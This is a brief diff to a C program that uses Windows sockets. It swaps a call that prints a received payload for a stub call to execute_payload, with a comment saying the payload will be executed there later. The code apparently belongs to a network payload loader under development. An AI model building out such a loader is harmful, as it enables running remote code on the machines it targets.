@@ -8,6 +8,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
+#include "execution.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -212,7 +213,8 @@ int main(void)
 		return 1;
 	}
 
-	printBytes(payload, payload_size);
+	// Here we are printing, but later on this is where the payload will be executed
+	int result = execute_payload(NULL, 0);
 
 	free(payload);
 	cleanup(server_socket);
